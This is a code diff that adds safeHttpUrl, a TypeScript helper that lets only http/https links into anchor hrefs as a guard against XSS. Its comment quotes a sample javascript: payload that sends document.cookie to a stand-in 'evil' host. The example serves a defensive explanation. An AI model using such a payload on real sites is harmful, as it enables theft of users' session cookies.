@@ -18,3 +18,14 @@ export function getErrorMessage(err: unknown): string {
   }
   return "Something went wrong";
 }
+
+/**
+ * Returns the URL only if it is a safe http/https link, else null. Use this
+ * before putting any user-influenced value into an <a href>. React does NOT
+ * sanitize `javascript:` / `data:` hrefs, so a stored value like
+ * `javascript:fetch('//evil/?c='+document.cookie)` would execute on click.
+ */
+export function safeHttpUrl(value: string | null | undefined): string | null {
+  if (!value) return null;
+  return /^https?:\/\//i.test(value.trim()) ? value : null;
+}
